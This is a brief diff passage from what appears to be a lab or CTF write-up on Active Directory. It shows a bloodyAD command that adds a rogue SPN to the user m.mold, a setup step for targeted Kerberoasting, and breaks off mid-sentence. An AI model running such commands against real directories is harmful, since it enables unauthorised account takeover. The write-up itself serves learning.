@@ -1000,3 +1000,12 @@ objectClass: WRITE
 
 Using `--detail` in bloodyAD i can find the specific attributes i can write to
 
+# Compromising `m.mold`
+
+```python
+bloodyAD --host dc01.trask.hsm -d trask.hsm -k msldap addspn 'CN=MATT MOLD,OU=STAFF,DC=TRASK,DC=HSM' 'service/hacked'
+SPN added!
+```
+
+Ill add the SPN using the TGT of 
+
